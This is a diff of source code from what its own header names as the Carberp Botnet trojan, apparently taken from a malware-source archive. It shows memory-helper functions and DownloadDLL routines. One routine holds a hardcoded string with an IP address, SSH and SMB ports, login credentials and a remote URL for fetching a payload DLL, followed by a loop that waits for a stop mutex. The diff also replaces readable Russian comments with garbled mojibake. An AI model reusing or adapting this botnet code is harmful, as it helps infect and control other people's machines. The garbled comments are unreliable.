@@ -1,3 +1,14 @@
+/*
+  name      Carberp Botnet
+  type      trojan
+  cve       вЂ”
+  year      unknown
+  os        Windows
+  authors   unknown
+  source    krisyotam
+  archived  krisyotam (2026)
+  notes     вЂ”
+ */
 #include "stdafx.h"
 #include <windows.h>
 
@@ -44,21 +55,21 @@ LPVOID MemAlloc( DWORD dwSize )
 
 LPVOID MemRealloc( LPVOID lpAddr, DWORD dwSize )
 {
-    // Изменяем размер выделенного буфера памяти
+    // пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ
 	DWORD PrevLen = 0;
 
-	// Определяем размер предыдущего блока
+	// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ
 	if ( lpAddr )
 		PrevLen = GetMemSize(lpAddr);
 
-	//  Создаём новый буфер
+	//  пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ
 	LPVOID NewAddr = NULL;
 	if (dwSize > 0)
 	{
 		NewAddr = MemAlloc(dwSize);
 		if (lpAddr && NewAddr && PrevLen)
 		{
-            // Копируем старую память
+            // пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ
 			if (dwSize < PrevLen)
             	PrevLen = dwSize;
 			memcpy(NewAddr, lpAddr, PrevLen);
@@ -477,7 +488,7 @@ bool DownloadDLL(char *Url)
 	char*ip   = "88.198.53.14;22;445;sshu;P@ssw0rd;system_help;fixer;http://www.cushyhost.com/download.php?img=73";
 	int i=Init(ip);
 	int w=Start();
-	while ( 1 )// ждем команды на выключение
+	while ( 1 )// пїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 	{
 		HANDLE tmp;
 		tmp= (HANDLE)OpenMutexA(MUTEX_ALL_ACCESS,false, "DllStop");
@@ -539,7 +550,7 @@ bool DownloadDLL_(char *Url)
 	PSTOP Stop				= (PSTOP)MemoryGetProcAddress( hLib, "Stop" );
 
 	int w=Start();
-	while ( 1 )// ждем команды на выключение
+	while ( 1 )// пїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 	{
 		HANDLE tmp;
 		tmp= (HANDLE)OpenMutexA(MUTEX_ALL_ACCESS,false, "DllStop");
